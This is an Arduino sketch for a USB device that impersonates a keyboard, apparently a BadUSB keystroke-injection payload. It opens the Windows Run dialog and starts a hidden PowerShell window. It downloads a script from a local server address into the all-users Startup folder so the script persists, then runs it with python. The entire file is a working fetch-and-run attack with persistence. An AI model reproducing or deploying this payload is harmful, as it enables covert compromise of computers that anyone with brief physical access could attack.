#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell -windowstyle hidden");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("wget \"http://127.0.0.1:5000/\" -outfile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\test.py\";");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("python \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\test.py\"");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}